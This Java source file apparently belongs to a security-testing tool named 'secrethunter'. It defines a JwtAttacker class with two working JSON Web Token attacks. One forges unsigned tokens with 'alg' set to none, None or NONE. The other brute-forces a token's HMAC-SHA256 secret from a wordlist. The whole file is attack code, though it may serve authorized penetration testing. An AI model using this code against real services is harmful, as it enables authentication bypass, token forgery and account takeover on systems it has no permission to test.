package com.sanasimran.secrethunter.jwt;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;

public class JwtAttacker {

    // Generates alg=none variants (some servers accept "none", "None", "NONE")
    public static List<String> generateAlgNoneTokens(String payloadJson) {
        String payloadEncoded = base64UrlEncode(payloadJson);

        return List.of(
                base64UrlEncode("{\"alg\":\"none\",\"typ\":\"JWT\"}") + "." + payloadEncoded + ".",
                base64UrlEncode("{\"alg\":\"None\",\"typ\":\"JWT\"}") + "." + payloadEncoded + ".",
                base64UrlEncode("{\"alg\":\"NONE\",\"typ\":\"JWT\"}") + "." + payloadEncoded + "."
        );
    }

    // Attempts HMAC-SHA256 signing with a list of common weak secrets;
    // returns the secret if the resulting signature matches the original token's signature
    public static String bruteForceSecret(String header, String payload, String originalSignature, List<String> wordlist) {
        String signingInput = header + "." + payload;

        for (String secret : wordlist) {
            try {
                String candidateSig = hmacSha256(signingInput, secret);
                if (candidateSig.equals(originalSignature)) {
                    return secret;
                }
            } catch (Exception ignored) {
            }
        }
        return null;
    }

    private static String hmacSha256(String data, String secret) throws Exception {
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), "HmacSHA256"));
        byte[] rawHmac = mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
        return Base64.getUrlEncoder().withoutPadding().encodeToString(rawHmac);
    }

    private static String base64UrlEncode(String input) {
        return Base64.getUrlEncoder().withoutPadding()
                .encodeToString(input.getBytes(StandardCharsets.UTF_8));
    }
}